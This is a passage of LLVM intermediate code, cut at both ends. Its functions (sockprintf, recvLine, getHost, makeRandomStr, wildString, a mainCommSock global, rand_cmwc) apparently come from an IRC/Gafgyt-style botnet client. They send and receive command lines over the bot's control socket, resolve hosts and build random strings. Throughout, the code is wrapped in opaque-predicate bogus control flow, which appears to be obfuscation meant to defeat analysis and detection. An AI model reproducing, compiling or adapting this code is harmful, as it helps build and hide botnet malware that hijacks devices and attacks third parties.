  %32 = load i8*, i8** %28, align 8
  %33 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %29, i32 0, i32 0
  %34 = call i32 @print(i8** %27, i8* %32, %struct.__va_list_tag* %33)
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define i32 @sockprintf(i32, i8*, ...) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca [1 x %struct.__va_list_tag], align 16
  %8 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8* %1, i8** %4, align 8
  %9 = call noalias i8* @malloc(i64 2048) #5
  store i8* %9, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  call void @llvm.memset.p0i8.i64(i8* %10, i8 0, i64 2048, i32 1, i1 false)
  %11 = load i8*, i8** %5, align 8
  store i8* %11, i8** %6, align 8
  %12 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %13 = bitcast %struct.__va_list_tag* %12 to i8*
  call void @llvm.va_start(i8* %13)
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %16 = call i32 @print(i8** %5, i8* %14, %struct.__va_list_tag* %15)
  %17 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %18 = bitcast %struct.__va_list_tag* %17 to i8*
  call void @llvm.va_end(i8* %18)
  %19 = load i8*, i8** %6, align 8
  %20 = load i8*, i8** %6, align 8
  %21 = call i64 @strlen(i8* %20) #9
  %22 = getelementptr inbounds i8, i8* %19, i64 %21
  store i8 10, i8* %22, align 1
  %23 = load i8*, i8** %6, align 8
  %24 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.471, i32 0, i32 0), i8* %23)
  %25 = load i32, i32* %3, align 4
  %26 = load i8*, i8** %6, align 8
  %27 = load i8*, i8** %6, align 8
  %28 = call i64 @strlen(i8* %27) #9
  %29 = call i64 @send(i32 %25, i8* %26, i64 %28, i32 16384)
  %30 = trunc i64 %29 to i32
  store i32 %30, i32* %8, align 4
  %31 = load i8*, i8** %6, align 8
  call void @free(i8* %31) #5
  %32 = load i32, i32* %8, align 4
  ret i32 %32
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #3

; Function Attrs: nounwind
declare void @free(i8*) #3

; Function Attrs: noinline nounwind uwtable
define i32 @wildString(i8*, i8*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %6 = load i8*, i8** %4, align 8
  %7 = load i8, i8* %6, align 1
  %8 = zext i8 %7 to i32
  switch i32 %8, label %102 [
    i32 0, label %9
    i32 42, label %29
    i32 63, label %69
  ]

; <label>:9:                                      ; preds = %2
  %10 = load i32, i32* @x.41
  %11 = load i32, i32* @y.42
  %12 = sub i32 %10, 1
  %13 = mul i32 %10, %12
  %14 = urem i32 %13, 2
  %15 = icmp eq i32 %14, 0
  %16 = icmp slt i32 %11, 10
  %17 = or i1 %15, %16
  br i1 %17, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %9
  %18 = load i8*, i8** %5, align 8
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  store i32 %20, i32* %3, align 4
  %21 = load i32, i32* @x.41
  %22 = load i32, i32* @y.42
  %23 = sub i32 %21, 1
  %24 = mul i32 %21, %23
  %25 = urem i32 %24, 2
  %26 = icmp eq i32 %25, 0
  %27 = icmp slt i32 %22, 10
  %28 = or i1 %26, %27
  br i1 %28, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %140

; <label>:29:                                     ; preds = %2
  %30 = load i8*, i8** %4, align 8
  %31 = getelementptr inbounds i8, i8* %30, i64 1
  %32 = load i8*, i8** %5, align 8
  %33 = call i32 @wildString(i8* %31, i8* %32)
  %34 = icmp ne i32 %33, 0
  br i1 %34, label %35, label %49

; <label>:35:                                     ; preds = %29
  %36 = load i8*, i8** %5, align 8
  %37 = load i8, i8* %36, align 1
  %38 = zext i8 %37 to i32
  %39 = icmp ne i32 %38, 0
  br i1 %39, label %40, label %47

; <label>:40:                                     ; preds = %35
  %41 = load i8*, i8** %4, align 8
  %42 = load i8*, i8** %5, align 8
  %43 = getelementptr inbounds i8, i8* %42, i64 1
  %44 = call i32 @wildString(i8* %41, i8* %43)
  %45 = icmp ne i32 %44, 0
  %46 = xor i1 %45, true
  br label %47

; <label>:47:                                     ; preds = %40, %35
  %48 = phi i1 [ false, %35 ], [ %46, %40 ]
  br label %49

; <label>:49:                                     ; preds = %47, %29
  %50 = phi i1 [ true, %29 ], [ %48, %47 ]
  %51 = load i32, i32* @x.41
  %52 = load i32, i32* @y.42
  %53 = sub i32 %51, 1
  %54 = mul i32 %51, %53
  %55 = urem i32 %54, 2
  %56 = icmp eq i32 %55, 0
  %57 = icmp slt i32 %52, 10
  %58 = or i1 %56, %57
  br i1 %58, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %49
  %59 = xor i1 %50, true
  %60 = zext i1 %59 to i32
  store i32 %60, i32* %3, align 4
  %61 = load i32, i32* @x.41
  %62 = load i32, i32* @y.42
  %63 = sub i32 %61, 1
  %64 = mul i32 %61, %63
  %65 = urem i32 %64, 2
  %66 = icmp eq i32 %65, 0
  %67 = icmp slt i32 %62, 10
  %68 = or i1 %66, %67
  br i1 %68, label %originalBBpart215, label %originalBB1alteredBB

originalBBpart215:                                ; preds = %originalBB1
  br label %140

; <label>:69:                                     ; preds = %2
  %70 = load i32, i32* @x.41
  %71 = load i32, i32* @y.42
  %72 = sub i32 %70, 1
  %73 = mul i32 %70, %72
  %74 = urem i32 %73, 2
  %75 = icmp eq i32 %74, 0
  %76 = icmp slt i32 %71, 10
  %77 = or i1 %75, %76
  br i1 %77, label %originalBB17, label %originalBB17alteredBB

originalBB17:                                     ; preds = %originalBB17alteredBB, %69
  %78 = load i8*, i8** %5, align 8
  %79 = load i8, i8* %78, align 1
  %80 = zext i8 %79 to i32
  %81 = icmp ne i32 %80, 0
  %82 = load i32, i32* @x.41
  %83 = load i32, i32* @y.42
  %84 = sub i32 %82, 1
  %85 = mul i32 %82, %84
  %86 = urem i32 %85, 2
  %87 = icmp eq i32 %86, 0
  %88 = icmp slt i32 %83, 10
  %89 = or i1 %87, %88
  br i1 %89, label %originalBBpart219, label %originalBB17alteredBB

originalBBpart219:                                ; preds = %originalBB17
  br i1 %81, label %90, label %98

; <label>:90:                                     ; preds = %originalBBpart219
  %91 = load i8*, i8** %4, align 8
  %92 = getelementptr inbounds i8, i8* %91, i64 1
  %93 = load i8*, i8** %5, align 8
  %94 = getelementptr inbounds i8, i8* %93, i64 1
  %95 = call i32 @wildString(i8* %92, i8* %94)
  %96 = icmp ne i32 %95, 0
  %97 = xor i1 %96, true
  br label %98

; <label>:98:                                     ; preds = %90, %originalBBpart219
  %99 = phi i1 [ false, %originalBBpart219 ], [ %97, %90 ]
  %100 = xor i1 %99, true
  %101 = zext i1 %100 to i32
  store i32 %101, i32* %3, align 4
  br label %140

; <label>:102:                                    ; preds = %2
  %103 = load i32, i32* @x.41
  %104 = load i32, i32* @y.42
  %105 = sub i32 %103, 1
  %106 = mul i32 %103, %105
  %107 = urem i32 %106, 2
  %108 = icmp eq i32 %107, 0
  %109 = icmp slt i32 %104, 10
  %110 = or i1 %108, %109
  br i1 %110, label %originalBB21, label %originalBB21alteredBB

originalBB21:                                     ; preds = %originalBB21alteredBB, %102
  %111 = load i8*, i8** %4, align 8
  %112 = load i8, i8* %111, align 1
  %113 = zext i8 %112 to i32
  %114 = call i32 @toupper(i32 %113) #9
  %115 = load i8*, i8** %5, align 8
  %116 = load i8, i8* %115, align 1
  %117 = zext i8 %116 to i32
  %118 = call i32 @toupper(i32 %117) #9
  %119 = icmp eq i32 %114, %118
  %120 = load i32, i32* @x.41
  %121 = load i32, i32* @y.42
  %122 = sub i32 %120, 1
  %123 = mul i32 %120, %122
  %124 = urem i32 %123, 2
  %125 = icmp eq i32 %124, 0
  %126 = icmp slt i32 %121, 10
  %127 = or i1 %125, %126
  br i1 %127, label %originalBBpart223, label %originalBB21alteredBB

originalBBpart223:                                ; preds = %originalBB21
  br i1 %119, label %128, label %136

; <label>:128:                                    ; preds = %originalBBpart223
  %129 = load i8*, i8** %4, align 8
  %130 = getelementptr inbounds i8, i8* %129, i64 1
  %131 = load i8*, i8** %5, align 8
  %132 = getelementptr inbounds i8, i8* %131, i64 1
  %133 = call i32 @wildString(i8* %130, i8* %132)
  %134 = icmp ne i32 %133, 0
  %135 = xor i1 %134, true
  br label %136

; <label>:136:                                    ; preds = %128, %originalBBpart223
  %137 = phi i1 [ false, %originalBBpart223 ], [ %135, %128 ]
  %138 = xor i1 %137, true
  %139 = zext i1 %138 to i32
  store i32 %139, i32* %3, align 4
  br label %140

; <label>:140:                                    ; preds = %136, %98, %originalBBpart215, %originalBBpart2
  %141 = load i32, i32* %3, align 4
  ret i32 %141

originalBBalteredBB:                              ; preds = %originalBB, %9
  %142 = load i8*, i8** %5, align 8
  %143 = load i8, i8* %142, align 1
  %144 = zext i8 %143 to i32
  store i32 %144, i32* %3, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %49
  %_ = sub i1 %50, true
  %gen = mul i1 %_, true
  %_2 = shl i1 %50, true
  %_3 = shl i1 %50, true
  %_4 = sub i1 %50, true
  %gen5 = mul i1 %_4, true
  %_6 = sub i1 %50, true
  %gen7 = mul i1 %_6, true
  %_8 = sub i1 false, %50
  %gen9 = add i1 %_8, true
  %_10 = shl i1 %50, true
  %_11 = sub i1 false, %50
  %gen12 = add i1 %_11, true
  %_13 = shl i1 %50, true
  %145 = xor i1 %50, true
  %146 = zext i1 %145 to i32
  store i32 %146, i32* %3, align 4
  br label %originalBB1

originalBB17alteredBB:                            ; preds = %originalBB17, %69
  %147 = load i8*, i8** %5, align 8
  %148 = load i8, i8* %147, align 1
  %149 = zext i8 %148 to i32
  %150 = icmp ne i32 %149, 0
  br label %originalBB17

originalBB21alteredBB:                            ; preds = %originalBB21, %102
  %151 = load i8*, i8** %4, align 8
  %152 = load i8, i8* %151, align 1
  %153 = zext i8 %152 to i32
  %154 = call i32 @toupper(i32 %153) #9
  %155 = load i8*, i8** %5, align 8
  %156 = load i8, i8* %155, align 1
  %157 = zext i8 %156 to i32
  %158 = call i32 @toupper(i32 %157) #9
  %159 = icmp eq i32 %154, %158
  br label %originalBB21
}

; Function Attrs: nounwind readonly
declare i32 @toupper(i32) #4

; Function Attrs: noinline nounwind uwtable
define i32 @getHost(i8*, %struct.in_addr*) #0 {
  %3 = load i32, i32* @x.43
  %4 = load i32, i32* @y.44
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca %struct.in_addr*, align 8
  %14 = alloca %struct.hostent*, align 8
  store i8* %0, i8** %12, align 8
  store %struct.in_addr* %1, %struct.in_addr** %13, align 8
  %15 = load i8*, i8** %12, align 8
  %16 = call i32 @inet_addr(i8* %15) #5
  %17 = load %struct.in_addr*, %struct.in_addr** %13, align 8
  %18 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %17, i32 0, i32 0
  store i32 %16, i32* %18, align 4
  %19 = icmp eq i32 %16, -1
  %20 = load i32, i32* @x.43
  %21 = load i32, i32* @y.44
  %22 = sub i32 %20, 1
  %23 = mul i32 %20, %22
  %24 = urem i32 %23, 2
  %25 = icmp eq i32 %24, 0
  %26 = icmp slt i32 %21, 10
  %27 = or i1 %25, %26
  br i1 %27, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %19, label %28, label %29

; <label>:28:                                     ; preds = %originalBBpart2
  store i32 1, i32* %11, align 4
  br label %30

; <label>:29:                                     ; preds = %originalBBpart2
  store i32 0, i32* %11, align 4
  br label %30

; <label>:30:                                     ; preds = %29, %28
  %31 = load i32, i32* %11, align 4
  ret i32 %31

originalBBalteredBB:                              ; preds = %originalBB, %2
  %32 = alloca i32, align 4
  %33 = alloca i8*, align 8
  %34 = alloca %struct.in_addr*, align 8
  %35 = alloca %struct.hostent*, align 8
  store i8* %0, i8** %33, align 8
  store %struct.in_addr* %1, %struct.in_addr** %34, align 8
  %36 = load i8*, i8** %33, align 8
  %37 = call i32 @inet_addr(i8* %36) #5
  %38 = load %struct.in_addr*, %struct.in_addr** %34, align 8
  %39 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %38, i32 0, i32 0
  store i32 %37, i32* %39, align 4
  %40 = icmp eq i32 %37, -1
  br label %originalBB
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #3

; Function Attrs: noinline nounwind uwtable
define void @makeRandomStr(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store i32 0, i32* %5, align 4
  br label %6

; <label>:6:                                      ; preds = %51, %2
  %7 = load i32, i32* @x.45
  %8 = load i32, i32* @y.46
  %9 = sub i32 %7, 1
  %10 = mul i32 %7, %9
  %11 = urem i32 %10, 2
  %12 = icmp eq i32 %11, 0
  %13 = icmp slt i32 %8, 10
  %14 = or i1 %12, %13
  br i1 %14, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %6
  %15 = load i32, i32* %5, align 4
  %16 = load i32, i32* %4, align 4
  %17 = icmp slt i32 %15, %16
  %18 = load i32, i32* @x.45
  %19 = load i32, i32* @y.46
  %20 = sub i32 %18, 1
  %21 = mul i32 %18, %20
  %22 = urem i32 %21, 2
  %23 = icmp eq i32 %22, 0
  %24 = icmp slt i32 %19, 10
  %25 = or i1 %23, %24
  br i1 %25, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %17, label %26, label %54

; <label>:26:                                     ; preds = %originalBBpart2
  %27 = load i32, i32* @x.45
  %28 = load i32, i32* @y.46
  %29 = sub i32 %27, 1
  %30 = mul i32 %27, %29
  %31 = urem i32 %30, 2
  %32 = icmp eq i32 %31, 0
  %33 = icmp slt i32 %28, 10
  %34 = or i1 %32, %33
  br i1 %34, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %26
  %35 = call i32 @rand_cmwc()
  %36 = urem i32 %35, 26
  %37 = add i32 %36, 65
  %38 = trunc i32 %37 to i8
  %39 = load i8*, i8** %3, align 8
  %40 = load i32, i32* %5, align 4
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds i8, i8* %39, i64 %41
  store i8 %38, i8* %42, align 1
  %43 = load i32, i32* @x.45
  %44 = load i32, i32* @y.46
  %45 = sub i32 %43, 1
  %46 = mul i32 %43, %45
  %47 = urem i32 %46, 2
  %48 = icmp eq i32 %47, 0
  %49 = icmp slt i32 %44, 10
  %50 = or i1 %48, %49
  br i1 %50, label %originalBBpart216, label %originalBB1alteredBB

originalBBpart216:                                ; preds = %originalBB1
  br label %51

; <label>:51:                                     ; preds = %originalBBpart216
  %52 = load i32, i32* %5, align 4
  %53 = add nsw i32 %52, 1
  store i32 %53, i32* %5, align 4
  br label %6

; <label>:54:                                     ; preds = %originalBBpart2
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %6
  %55 = load i32, i32* %5, align 4
  %56 = load i32, i32* %4, align 4
  %57 = icmp slt i32 %55, %56
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %26
  %58 = call i32 @rand_cmwc()
  %_ = shl i32 %58, 26
  %_2 = sub i32 %58, 26
  %gen = mul i32 %_2, 26
  %_3 = shl i32 %58, 26
  %_4 = sub i32 0, %58
  %gen5 = add i32 %_4, 26
  %_6 = shl i32 %58, 26
  %_7 = sub i32 0, %58
  %gen8 = add i32 %_7, 26
  %_9 = sub i32 0, %58
  %gen10 = add i32 %_9, 26
  %_11 = sub i32 %58, 26
  %gen12 = mul i32 %_11, 26
  %59 = urem i32 %58, 26
  %_13 = sub i32 %59, 65
  %gen14 = mul i32 %_13, 65
  %60 = add i32 %59, 65
  %61 = trunc i32 %60 to i8
  %62 = load i8*, i8** %3, align 8
  %63 = load i32, i32* %5, align 4
  %64 = sext i32 %63 to i64
  %65 = getelementptr inbounds i8, i8* %62, i64 %64
  store i8 %61, i8* %65, align 1
  br label %originalBB1
}

; Function Attrs: noinline nounwind uwtable
define i32 @recvLine(i32, i8*, i32) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca %struct.fd_set, align 8
  %9 = alloca %struct.timeval, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8, align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %19 = load i8*, i8** %6, align 8
  %20 = load i32, i32* %7, align 4
  %21 = sext i32 %20 to i64
  call void @llvm.memset.p0i8.i64(i8* %19, i8 0, i64 %21, i32 1, i1 false)
  %22 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %22, align 8
  %23 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %23, align 8
  br label %24

; <label>:24:                                     ; preds = %3
  %25 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %26 = getelementptr inbounds [16 x i64], [16 x i64]* %25, i64 0, i64 0
  %27 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %26) #5, !srcloc !2
  %28 = extractvalue { i64, i64* } %27, 0
  %29 = extractvalue { i64, i64* } %27, 1
  %30 = trunc i64 %28 to i32
  store i32 %30, i32* %10, align 4
  %31 = ptrtoint i64* %29 to i64
  %32 = trunc i64 %31 to i32
  store i32 %32, i32* %11, align 4
  br label %33

; <label>:33:                                     ; preds = %24
  %34 = load i32, i32* @x.47
  %35 = load i32, i32* @y.48
  %36 = sub i32 %34, 1
  %37 = mul i32 %34, %36
  %38 = urem i32 %37, 2
  %39 = icmp eq i32 %38, 0
  %40 = icmp slt i32 %35, 10
  %41 = or i1 %39, %40
  br i1 %41, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %33
  %42 = load i32, i32* %5, align 4
  %43 = srem i32 %42, 64
  %44 = zext i32 %43 to i64
  %45 = shl i64 1, %44
  %46 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %47 = load i32, i32* %5, align 4
  %48 = sdiv i32 %47, 64
  %49 = sext i32 %48 to i64
  %50 = getelementptr inbounds [16 x i64], [16 x i64]* %46, i64 0, i64 %49
  %51 = load i64, i64* %50, align 8
  %52 = or i64 %51, %45
  store i64 %52, i64* %50, align 8
  %53 = load i32, i32* %5, align 4
  %54 = add nsw i32 %53, 1
  %55 = call i32 @select(i32 %54, %struct.fd_set* %8, %struct.fd_set* null, %struct.fd_set* %8, %struct.timeval* %9)
  store i32 %55, i32* %12, align 4
  %56 = icmp sle i32 %55, 0
  %57 = load i32, i32* @x.47
  %58 = load i32, i32* @y.48
  %59 = sub i32 %57, 1
  %60 = mul i32 %57, %59
  %61 = urem i32 %60, 2
  %62 = icmp eq i32 %61, 0
  %63 = icmp slt i32 %58, 10
  %64 = or i1 %62, %63
  br i1 %64, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %56, label %65, label %150

; <label>:65:                                     ; preds = %originalBBpart2
  %66 = load i32, i32* @x.47
  %67 = load i32, i32* @y.48
  %68 = sub i32 %66, 1
  %69 = mul i32 %66, %68
  %70 = urem i32 %69, 2
  %71 = icmp eq i32 %70, 0
  %72 = icmp slt i32 %67, 10
  %73 = or i1 %71, %72
  br i1 %73, label %originalBB25, label %originalBB25alteredBB

originalBB25:                                     ; preds = %originalBB25alteredBB, %65
  %74 = load i32, i32* @x.47
  %75 = load i32, i32* @y.48
  %76 = sub i32 %74, 1
  %77 = mul i32 %74, %76
  %78 = urem i32 %77, 2
  %79 = icmp eq i32 %78, 0
  %80 = icmp slt i32 %75, 10
  %81 = or i1 %79, %80
  br i1 %81, label %originalBBpart227, label %originalBB25alteredBB

originalBBpart227:                                ; preds = %originalBB25
  br label %82

; <label>:82:                                     ; preds = %originalBBpart237, %originalBBpart227
  %83 = load i32, i32* %13, align 4
  %84 = icmp slt i32 %83, 10
  br i1 %84, label %85, label %149

; <label>:85:                                     ; preds = %82
  %86 = load i32, i32* @x.47
  %87 = load i32, i32* @y.48
  %88 = sub i32 %86, 1
  %89 = mul i32 %86, %88
  %90 = urem i32 %89, 2
  %91 = icmp eq i32 %90, 0
  %92 = icmp slt i32 %87, 10
  %93 = or i1 %91, %92
  br i1 %93, label %originalBB29, label %originalBB29alteredBB

originalBB29:                                     ; preds = %originalBB29alteredBB, %85
  %94 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %94, align 8
  %95 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %95, align 8
  %96 = load i32, i32* @x.47
  %97 = load i32, i32* @y.48
  %98 = sub i32 %96, 1
  %99 = mul i32 %96, %98
  %100 = urem i32 %99, 2
  %101 = icmp eq i32 %100, 0
  %102 = icmp slt i32 %97, 10
  %103 = or i1 %101, %102
  br i1 %103, label %originalBBpart231, label %originalBB29alteredBB

originalBBpart231:                                ; preds = %originalBB29
  br label %104

; <label>:104:                                    ; preds = %originalBBpart231
  %105 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %106 = getelementptr inbounds [16 x i64], [16 x i64]* %105, i64 0, i64 0
  %107 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %106) #5, !srcloc !3
  %108 = extractvalue { i64, i64* } %107, 0
  %109 = extractvalue { i64, i64* } %107, 1
  %110 = trunc i64 %108 to i32
  store i32 %110, i32* %14, align 4
  %111 = ptrtoint i64* %109 to i64
  %112 = trunc i64 %111 to i32
  store i32 %112, i32* %15, align 4
  br label %113

; <label>:113:                                    ; preds = %104
  %114 = load i32, i32* %5, align 4
  %115 = srem i32 %114, 64
  %116 = zext i32 %115 to i64
  %117 = shl i64 1, %116
  %118 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %119 = load i32, i32* %5, align 4
  %120 = sdiv i32 %119, 64
  %121 = sext i32 %120 to i64
  %122 = getelementptr inbounds [16 x i64], [16 x i64]* %118, i64 0, i64 %121
  %123 = load i64, i64* %122, align 8
  %124 = or i64 %123, %117
  store i64 %124, i64* %122, align 8
  %125 = load i32, i32* %5, align 4
  %126 = add nsw i32 %125, 1
  %127 = call i32 @select(i32 %126, %struct.fd_set* %8, %struct.fd_set* null, %struct.fd_set* %8, %struct.timeval* %9)
  store i32 %127, i32* %12, align 4
  %128 = icmp sle i32 %127, 0
  br i1 %128, label %129, label %148

; <label>:129:                                    ; preds = %113
  %130 = load i32, i32* @x.47
  %131 = load i32, i32* @y.48
  %132 = sub i32 %130, 1
  %133 = mul i32 %130, %132
  %134 = urem i32 %133, 2
  %135 = icmp eq i32 %134, 0
  %136 = icmp slt i32 %131, 10
  %137 = or i1 %135, %136
  br i1 %137, label %originalBB33, label %originalBB33alteredBB

originalBB33:                                     ; preds = %originalBB33alteredBB, %129
  %138 = load i32, i32* %13, align 4
  %139 = add nsw i32 %138, 1
  store i32 %139, i32* %13, align 4
  %140 = load i32, i32* @x.47
  %141 = load i32, i32* @y.48
  %142 = sub i32 %140, 1
  %143 = mul i32 %140, %142
  %144 = urem i32 %143, 2
  %145 = icmp eq i32 %144, 0
  %146 = icmp slt i32 %141, 10
  %147 = or i1 %145, %146
  br i1 %147, label %originalBBpart237, label %originalBB33alteredBB

originalBBpart237:                                ; preds = %originalBB33
  br label %82

; <label>:148:                                    ; preds = %113
  br label %149

; <label>:149:                                    ; preds = %148, %82
  br label %150

; <label>:150:                                    ; preds = %149, %originalBBpart2
  store i32 0, i32* %18, align 4
  %151 = load i8*, i8** %6, align 8
  store i8* %151, i8** %17, align 8
  br label %152

; <label>:152:                                    ; preds = %originalBBpart266, %150
  %153 = load i32, i32* @x.47
  %154 = load i32, i32* @y.48
  %155 = sub i32 %153, 1
  %156 = mul i32 %153, %155
  %157 = urem i32 %156, 2
  %158 = icmp eq i32 %157, 0
  %159 = icmp slt i32 %154, 10
  %160 = or i1 %158, %159
  br i1 %160, label %originalBB39, label %originalBB39alteredBB

originalBB39:                                     ; preds = %originalBB39alteredBB, %152
  %161 = load i32, i32* %7, align 4
  %162 = add nsw i32 %161, -1
  store i32 %162, i32* %7, align 4
  %163 = icmp sgt i32 %161, 1
  %164 = load i32, i32* @x.47
  %165 = load i32, i32* @y.48
  %166 = sub i32 %164, 1
  %167 = mul i32 %164, %166
  %168 = urem i32 %167, 2
  %169 = icmp eq i32 %168, 0
  %170 = icmp slt i32 %165, 10
  %171 = or i1 %169, %170
  br i1 %171, label %originalBBpart247, label %originalBB39alteredBB

originalBBpart247:                                ; preds = %originalBB39
  br i1 %163, label %172, label %253

; <label>:172:                                    ; preds = %originalBBpart247
  %173 = load i32, i32* @mainCommSock, align 4
  %174 = call i64 @recv(i32 %173, i8* %16, i64 1, i32 0)
  %175 = icmp ne i64 %174, 1
  br i1 %175, label %176, label %194

; <label>:176:                                    ; preds = %172
  %177 = load i32, i32* @x.47
  %178 = load i32, i32* @y.48
  %179 = sub i32 %177, 1
  %180 = mul i32 %177, %179
  %181 = urem i32 %180, 2
  %182 = icmp eq i32 %181, 0
  %183 = icmp slt i32 %178, 10
  %184 = or i1 %182, %183
  br i1 %184, label %originalBB49, label %originalBB49alteredBB

originalBB49:                                     ; preds = %originalBB49alteredBB, %176
  %185 = load i8*, i8** %17, align 8
  store i8 0, i8* %185, align 1
  store i32 -1, i32* %4, align 4
  %186 = load i32, i32* @x.47
  %187 = load i32, i32* @y.48
  %188 = sub i32 %186, 1
  %189 = mul i32 %186, %188
  %190 = urem i32 %189, 2
  %191 = icmp eq i32 %190, 0
  %192 = icmp slt i32 %187, 10
  %193 = or i1 %191, %192
  br i1 %193, label %originalBBpart251, label %originalBB49alteredBB

originalBBpart251:                                ; preds = %originalBB49
  br label %256

; <label>:194:                                    ; preds = %172
  %195 = load i32, i32* @x.47
  %196 = load i32, i32* @y.48
  %197 = sub i32 %195, 1
  %198 = mul i32 %195, %197
  %199 = urem i32 %198, 2
  %200 = icmp eq i32 %199, 0
  %201 = icmp slt i32 %196, 10
  %202 = or i1 %200, %201
  br i1 %202, label %originalBB53, label %originalBB53alteredBB

originalBB53:                                     ; preds = %originalBB53alteredBB, %194
  %203 = load i8, i8* %16, align 1
  %204 = load i8*, i8** %17, align 8
  %205 = getelementptr inbounds i8, i8* %204, i32 1
  store i8* %205, i8** %17, align 8
  store i8 %203, i8* %204, align 1
  %206 = load i8, i8* %16, align 1
  %207 = zext i8 %206 to i32
  %208 = icmp eq i32 %207, 10
  %209 = load i32, i32* @x.47
  %210 = load i32, i32* @y.48
  %211 = sub i32 %209, 1
  %212 = mul i32 %209, %211
  %213 = urem i32 %212, 2
  %214 = icmp eq i32 %213, 0
  %215 = icmp slt i32 %210, 10
  %216 = or i1 %214, %215
  br i1 %216, label %originalBBpart255, label %originalBB53alteredBB

originalBBpart255:                                ; preds = %originalBB53
  br i1 %208, label %217, label %234

; <label>:217:                                    ; preds = %originalBBpart255
  %218 = load i32, i32* @x.47
  %219 = load i32, i32* @y.48
  %220 = sub i32 %218, 1
  %221 = mul i32 %218, %220
  %222 = urem i32 %221, 2
  %223 = icmp eq i32 %222, 0
  %224 = icmp slt i32 %219, 10
  %225 = or i1 %223, %224
  br i1 %225, label %originalBB57, label %originalBB57alteredBB

originalBB57:                                     ; preds = %originalBB57alteredBB, %217
  %226 = load i32, i32* @x.47
  %227 = load i32, i32* @y.48
  %228 = sub i32 %226, 1
  %229 = mul i32 %226, %228
  %230 = urem i32 %229, 2
  %231 = icmp eq i32 %230, 0
  %232 = icmp slt i32 %227, 10
  %233 = or i1 %231, %232
  br i1 %233, label %originalBBpart259, label %originalBB57alteredBB

originalBBpart259:                                ; preds = %originalBB57
  br label %253

; <label>:234:                                    ; preds = %originalBBpart255
  %235 = load i32, i32* @x.47
  %236 = load i32, i32* @y.48
  %237 = sub i32 %235, 1
  %238 = mul i32 %235, %237
  %239 = urem i32 %238, 2
  %240 = icmp eq i32 %239, 0
  %241 = icmp slt i32 %236, 10
  %242 = or i1 %240, %241
  br i1 %242, label %originalBB61, label %originalBB61alteredBB

